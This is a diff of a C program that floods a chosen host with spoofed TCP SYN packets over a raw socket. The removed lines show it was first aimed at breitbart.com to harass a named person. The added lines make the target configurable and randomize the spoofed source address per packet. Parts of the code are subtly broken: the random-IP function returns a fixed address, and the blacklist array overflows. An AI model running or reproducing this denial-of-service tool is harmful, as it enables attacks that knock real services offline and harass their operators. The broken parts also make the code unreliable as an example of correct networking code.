@@ -32,8 +32,13 @@ unsigned short csum (unsigned short *ptr, int nbytes);
 
 // get an IP address for a hostname
 in_addr_t getip (char *hostname);
+in_addr_t randip (void);
 
+// obtain and configure a socket
 int get_socket (void);
+
+// 
+void blacklist_init (void);
 
 // all of the dirty TCP / IP packet initialization in one amazing function
 void dgram_init (char *source_host, char *destination_host);
@@ -52,45 +57,79 @@ struct s_thread_data {
     pthread_t *threads;     // threads
 };
 
-struct s_packet_data {
-    struct sockaddr_in addr;
-    size_t ip_len;
-    char datagram[4096];
-};
 
-
+//
 // global variables. such design
+//
 struct s_thread_data thread_data;
-struct s_packet_data packet_data;
+
+in_addr_t dst_addr;
 time_t tstart;
+
+// list of bad source addresse ranges
+struct iprange {
+    uint32_t from;
+    uint32_t to;
+};
+struct iprange src_blacklist[5];
 
 
 /**
  * main function
- * accepts no arguments. starts up one thread per CPU to fire SYN packets off to
- * the host for "breitbart.com" as fast as humanly possible. the point is to 
- * harrass stephen bannon.
- *
- * just run it and hit CTRL+C to quit
  */
-int main (void)
+int main (int argc, char **argv)
 {   
 
-    // If they don't like being harrassed online they can just "log off" :)
-    // http://www.breitbart.com/tech/2015/12/08/birth-control-makes-women-unattractive-and-crazy/
-    // http://www.breitbart.com/milo/2016/07/05/solution-online-harassment-simple-women-log-off/
-    dgram_init ("trump.com",    // source hostname 
-                "breitbart.com" // destination hostname
-               );
+    char *hostname = NULL;
+    int c;
+    while ( (c = getopt(argc, argv, "h:")) != -1 ) {
+        switch (c) {
+            case 'h':
+                hostname = optarg;
+                break;
+            default:
+                fprintf(stderr, "usage: %s -h hostname\n", argv[0]);
+                return 1;
+        }
+    }
+
+    if (hostname == NULL) {
+        fprintf(stderr, "usage: %s -h hostname\n", argv[0]);
+        return 1;
+    }
+
+    // lookup destination address
+    dst_addr = getip (hostname);
+
+    // setup IP data
+    blacklist_init ();
 
     // run
     start_threads ();
 
     // wait for signal
     wait_for_interrupt ();
-
-    printf("Done\n");
 }
+
+
+/**
+ * initialize list of invalid source IP ranges
+ */
+void blacklist_init (void) {
+    #define BLACKLIST(a0,b0,c0,d0, a1,b1,c1,d1) \
+        src_blacklist[i].from = ((a0 << 24)|(b0 << 16)|(c0 << 8)|d0);\
+        src_blacklist[i++].to = ((a1 << 24)|(b1 << 16)|(c1 << 8)|d1)
+
+    int i = 0;
+    BLACKLIST(  0,  0,  0,  0,    0,255,255,255);
+    BLACKLIST(127,  0,  0,  0,  127,255,255,255);
+    BLACKLIST(192,  0,  0,  0,  192,255,255,255);
+    BLACKLIST(198, 51,100,  0,  198, 51,100,255);
+    BLACKLIST(203,  0,113,  0,  203,  0,113,255);
+    BLACKLIST(239,  0,  0,  0,  255,255,255,255);
+} 
+
+
 
 /**
  * open a raw socket
@@ -132,116 +171,6 @@ struct checksum_header
      
     struct tcphdr tcp;
 };
-
-
-/**
- * sets up TCP / IP headers for SYN packet. the intention is to call once and 
- * re-use the packet. this is where most of the cross-platform stuff lives 
- */
-void dgram_init (char *source_host, char *destination_host) {
-    
-    // spoof source ip
-    in_addr_t source_ip = getip(source_host);
-
-    //IP header
-    iph_t *iph = (iph_t *) packet_data.datagram;
-
-    //TCP header
-    struct tcphdr *tcph = (struct tcphdr *) 
-                          (packet_data.datagram + sizeof (struct ip));
-    struct checksum_header csh;
-    
-    packet_data.addr.sin_family = AF_INET;
-    packet_data.addr.sin_port = htons(8000);
-
-    packet_data.addr.sin_addr.s_addr = getip(destination_host);
-    memset (packet_data.datagram, 0, 4096);
-     
-    //IP Header
-#ifdef __APPLE__
-    iph->ip_hl = 5;
-    iph->ip_v = 4;
-    iph->ip_tos = 0;
-    iph->ip_len = sizeof (struct ip) + sizeof (struct tcphdr);
-    iph->ip_id = htons(54321);  //Id of this packet
-    iph->ip_off = 0;
-    iph->ip_ttl = 255;
-    iph->ip_p = IPPROTO_TCP;
-    iph->ip_sum = 0;      //Set to 0 before calculating checksum
-    iph->ip_src.s_addr = source_ip;
-    iph->ip_dst.s_addr = packet_data.addr.sin_addr.s_addr;
-     
-    iph->ip_sum = csum ((unsigned short *) packet_data.datagram, 
-                        iph->ip_len >> 1);
-
-#else
-    iph->ihl = 5;
-    iph->version = 4;
-    iph->tos = 0;
-    iph->tot_len = sizeof (struct ip) + sizeof (struct tcphdr);
-    iph->id = htons(54321);  //Id of this packet
-    iph->frag_off = 0;
-    iph->ttl = 255;
-    iph->protocol = IPPROTO_TCP;
-    iph->check = 0;      //Set to 0 before calculating checksum
-    iph->saddr = source_ip;
-    iph->daddr = packet_data.addr.sin_addr.s_addr;
-     
-    iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
-#endif
-     
-    //TCP Header
-#ifdef __APPLE__
-    tcph->th_sport = htons (1234);
-    tcph->th_dport = htons (80);
-    tcph->th_seq = 0;
-    tcph->th_ack = 0x0;
-    tcph->th_x2 = 0x0;
-    tcph->th_off = 5;               // first and only tcp segment
-    tcph->th_flags = TH_SYN;        // SYN
-    tcph->th_win = htons (65535);   // max window size
-    tcph->th_sum = 0x0;             // IP stack fills this in
-    tcph->th_urp = 0x0;
-    tcph->th_sum = 0;
-#else 
-    tcph->source = htons (1234);
-    tcph->dest = htons (80);
-    tcph->seq = 0;
-    tcph->ack_seq = 0;
-    tcph->doff = 5;                 // first and only tcp segment
-    tcph->fin=0;
-    tcph->syn=1;                    // SYN
-    tcph->rst=0;
-    tcph->psh=0;
-    tcph->ack=0;
-    tcph->urg=0;
-    tcph->window = htons (65535);   // maximum allowed window size
-    tcph->check = 0;                // IP stack fills this in
-    tcph->urg_ptr = 0;
-#endif
-     
-    //Now the IP checksum
-    csh.source_address = source_ip;
-    csh.dest_address = packet_data.addr.sin_addr.s_addr;
-    csh.placeholder = 0;
-    csh.protocol = IPPROTO_TCP;
-    csh.tcp_length = htons(20);
-    memcpy(&csh.tcp , tcph , sizeof *tcph);
-     
-#ifdef __APPLE__
-    tcph->th_sum = csum( (unsigned short*) &csh , sizeof csh);
-#else
-    tcph->check = csum( (unsigned short*) &csh , sizeof csh);
-#endif
-
-    // set ip_len
-    packet_data.ip_len =
-#ifdef __APPLE__
-    iph->ip_len;
-#else
-    iph->tot_len;   
-#endif
-}
 
 
 /**
@@ -302,6 +231,30 @@ in_addr_t getip (char *hostname) {
 
 
 /**
+ * generate a random IPV4 address
+ */
+in_addr_t randip () {
+    char data[16];
+    
+    int r;
+    try_addr: 
+    r = rand();
+    for (int i = 0; i < 5; ++i) {
+        if (r >= src_blacklist[i].from && r <= src_blacklist[i].to) {
+            goto try_addr;
+        }
+    }
+    
+    sprintf (data, "%d.%d.%d.%d",
+             (r >> 24) & 0xff,
+             (r >> 16) & 0xff,
+             (r >>  8) & 0xff, 
+             (r >>  0) & 0xff);
+    return inet_addr ("192.168.1.2");
+}
+
+
+/**
  * start the threads. attempts to detect number of processors to start 1 per 
  * core. if that fails, it just starts 1 thread
  */
@@ -348,40 +301,160 @@ void* thread_go (void *arg) {
     uint64_t retry_count = 10;
     int sleep_usec = 50000;
 
+    struct sockaddr_in addr;
+    char datagram[4096];
+    size_t ip_len;
+    short seq = 0;
+
     while (!thread_data.stop) {
+
+        // spoof source ip
+        in_addr_t source_ip = randip ();
+
+        //IP header
+        iph_t *iph = (iph_t *) datagram;
+
+        //TCP header
+        struct tcphdr *tcph = (struct tcphdr *) 
+                              (datagram + sizeof (struct ip));
+        struct checksum_header csh;
+        
+        addr.sin_family = AF_INET;
+        addr.sin_port = htons (80);
+
+        addr.sin_addr.s_addr = dst_addr;
+        memset (datagram, 0, 4096);
+         
+        //IP Header
+#ifdef __APPLE__
+        iph->ip_hl = 5;
+        iph->ip_v = 4;
+        iph->ip_tos = 0;
+        iph->ip_len = sizeof (struct ip) + sizeof (struct tcphdr);
+        iph->ip_id = htons(++seq);      // random packet id
+        iph->ip_off = 0;
+        iph->ip_ttl = 255;
+        iph->ip_p = IPPROTO_TCP;
+        iph->ip_sum = 0;                // set to 0 before calculating checksum
+        iph->ip_src.s_addr = source_ip;
+        iph->ip_dst.s_addr = addr.sin_addr.s_addr;
+         
+        iph->ip_sum = csum ((unsigned short *) datagram, 
+                            iph->ip_len >> 1);
+#else
+        iph->ihl = 5;
+        iph->version = 4;
+        iph->tos = 0;
+        iph->tot_len = sizeof (struct ip) + sizeof (struct tcphdr);
+        iph->id = htons(++seq);         // random packet id
+        iph->frag_off = 0;
+        iph->ttl = 255;
+        iph->protocol = IPPROTO_TCP;
+        iph->check = 0;                 // set to 0 before calculating checksum
+        iph->saddr = source_ip;
+        iph->daddr = addr.sin_addr.s_addr;
+         
+        iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
+#endif
+         
+        //TCP Header
+#ifdef __APPLE__
+        tcph->th_sport = htons (1234); // random source port
+        tcph->th_dport = htons (80);
+        tcph->th_seq = 0;
+        tcph->th_ack = 0x0;
+        tcph->th_x2 = 0x0;
+        tcph->th_off = 5;               // first and only tcp segment
+        tcph->th_flags = TH_SYN;        // SYN
+        tcph->th_win = htons (65535);   // max window size
+        tcph->th_sum = 0x0;             // IP stack fills this in
+        tcph->th_urp = 0x0;
+#else 
+        tcph->source = htons (1234);   // random source port
+        tcph->dest = htons (80);
+        tcph->seq = 0;
+        tcph->ack_seq = 0;
+        tcph->doff = 5;                 // first and only tcp segment
+        tcph->fin=0;
+        tcph->syn=1;                    // SYN
+        tcph->rst=0;
+        tcph->psh=0;
+        tcph->ack=0;
+        tcph->urg=0;
+        tcph->window = htons (65535);   // max window size
+        tcph->check = 0;                // IP stack fills this in
+        tcph->urg_ptr = 0;
+#endif
+         
+        // IP checksum
+        csh.source_address = source_ip;
+        csh.dest_address = addr.sin_addr.s_addr;
+        csh.placeholder = 0;
+        csh.protocol = IPPROTO_TCP;
+        csh.tcp_length = htons(20);
+        memcpy(&csh.tcp , tcph , sizeof *tcph);
+
+        iph->
+#ifdef __APPLE__
+        ip_sum
+#else
+        check
+#endif
+         = csum( (unsigned short*) &csh , sizeof csh);
+
+        // set ip_len
+        ip_len =
+#ifdef __APPLE__
+        iph->ip_len;
+#else
+        iph->tot_len;   
+#endif
+
         if (sendto (s,                  // socket 
-                    packet_data.datagram,
-                    packet_data.ip_len, // total length of datagram
+                    datagram,
+                    ip_len,             // total length of datagram
                     0,                  // routing flags
-                    (struct sockaddr *) &packet_data.addr, 
-                    sizeof (packet_data.addr)) < 0)
+                    (struct sockaddr *) &addr, 
+                    sizeof (addr)) < 0)
         {
             if (errno == ENOBUFS) {
                 // ran out of buffer
                 // wait a little and retry
                 ++buf_err_count;
 
-                // also, try to adjust sleep_usec
                 if (count > 0) {
+                    // also, try to adjust sleep_usec so we don't have to sleep
+                    // as often
                     double buf_err_rate = (double) buf_err_count / count;
                     if (buf_err_rate > 0.001 && sleep_usec < 500000) {
                         sleep_usec *= 1.5;
-                        printf ("sleep_usec set to %d\n", sleep_usec);
+                        printf ("Frequent buffer overflow - "
+                                "chilling out more\n");
                     } else if (buf_err_rate < 0.0001 && sleep_usec > 10000) {
                         sleep_usec /= 1.5;
-                        printf ("sleep_usec set to %d\n", sleep_usec);
+                        printf ("Infrequent buffer overflow - "
+                                "chilling out less\n");
                     }
                 }
 
                 usleep (sleep_usec);
+            } else if (errno == EADDRNOTAVAIL) {
+                // this means we generated an invalid source IP
+                // report it so it can be blacklisted
+                struct in_addr source_addr;
+                source_addr.s_addr = source_ip;
+                fprintf(stderr, 
+                        "Error: source address %s is invalid\n", 
+                        inet_ntoa (source_addr));
             } else {
                 if (retry_count-- <= 0) {
+                    fprintf(stderr, "errno: %d\n", errno);
                     perror ("sendto() failed");
                     break;
                 }
             }
         } else {
-            // success
+            // success - reset retry_count and increment count
             retry_count = 0;
             ++count;   
         }
@@ -415,16 +488,17 @@ void wait_for_interrupt (void) {
     }
     uint64_t packets_per_sec = count / exec_time;
 
-    // print number of sent packets and packets per second
-    printf ("Sent "
-#ifdef __APPLE__
-        // mac: complains if not formatted as unsigned long long 
-        "%llu packets (%llu"
-#else 
-        // linux: complains if not formatted long unsigned
-        "%lu packets (%lu"
+#ifdef __APPLE__ 
+    // mac: complains if not formatted as unsigned long long 
+    #define LLU_FMT "%llu"
+#else
+    // linux: complains if not formatted long unsigned
+    #define LLU_FMT "%lu"
 #endif
-        " packets / second)\n", count, packets_per_sec);
+    // print number of sent packets and packets per second
+    printf ("Sent " LLU_FMT " packets (" LLU_FMT " packets / second)\n",
+            count, 
+            packets_per_sec);
 }
 
 
